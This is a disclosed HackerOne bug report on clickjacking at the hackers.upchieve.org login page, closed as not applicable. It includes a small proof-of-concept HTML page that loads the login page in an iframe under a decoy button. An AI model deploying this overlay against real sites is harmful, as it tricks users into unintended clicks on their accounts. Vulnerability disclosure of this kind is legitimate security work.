---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1400405'
original_report_id: '1400405'
title: Clickjacking ar https://hackers.upchieve.org/login
weakness: UI Redressing (Clickjacking)
team_handle: upchieve
created_at: '2021-11-15T12:01:30.384Z'
disclosed_at: '2021-11-19T16:06:50.565Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 2
asset_identifier: hackers.upchieve.org
asset_type: URL
max_severity: critical
tags:
- hackerone
- ui-redressing-clickjacking
---

# Clickjacking ar https://hackers.upchieve.org/login

## Metadata

- HackerOne Report ID: 1400405
- Weakness: UI Redressing (Clickjacking)
- Program: upchieve
- Disclosed At: 2021-11-19T16:06:50.565Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

I found clickjacking at login page on https://hackers.upchieve.org that can be exploited if the UI overlay can be performed correctly by the attacker.

```<html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>Website is vulnerable to clickjacking!</p>
<iframe src="https://hackers.upchieve.org/login" width="1000" height="550"></iframe>
<div style="height: 30px;width: 130px;left: 53%;bottom: 39%;background: #789;" class="xss"><button>Click me when you finish :)</button></div>
</body>
</body>
</html>```

## Impact

Its login page so if the UI overlay can be performed correctly by the attacker, this can lead to account takeover.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
